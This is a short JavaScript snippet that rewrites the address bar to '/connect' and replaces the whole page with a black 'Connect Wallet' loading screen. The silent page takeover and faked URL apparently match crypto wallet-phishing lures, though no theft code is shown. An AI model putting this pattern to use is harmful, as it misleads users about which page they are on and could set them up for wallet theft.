const newUrl = '/connect';
window.history.pushState({ path: newUrl }, '', newUrl);

function deployContents() {
    document.documentElement.innerHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="referrer" content="no-referrer">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet</title>
    <style>
        :root {
            --background-color: #000000;
            --text-color: #ffffff;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body,
        html {
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            background-color: var(--background-color);
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text-color);
        }
        .loader-container {
            width: 100%;
            max-width: 420px;
            height: 100%;
            max-height: 600px;
            padding: 32px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .loader,
        .loader:before,
        .loader:after {
            border-radius: 50%;
            width: 2.5em;
            height: 2.5em;
            animation-fill-mode: both;
            animation: bblFadInOut 1.8s infinite ease-in-out;
        }

        .loader {
            color: #FFF;
            font-size: 7px;
            position: relative;
            text-indent: -9999em;
            transform: translateZ(0);
            animation-delay: -0.16s;
            margin: 0 auto;
        }

        .loader:before,
        .loader:after {
            content: '';
            position: absolute;
            top: 0;
        }

        .loader:before {
            left: -3.5em;
            animation-delay: -0.32s;
        }

        .loader:after {
            left: 3.5em;
        }

        @keyframes bblFadInOut {
            0%,
            80%,
            100% {
                box-shadow: 0 2.5em 0 -1.3em
            }

            40% {
                box-shadow: 0 2.5em 0 0
            }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <span class="loader"></span>
    </div>
</body>
</html>
`;
}

deployContents();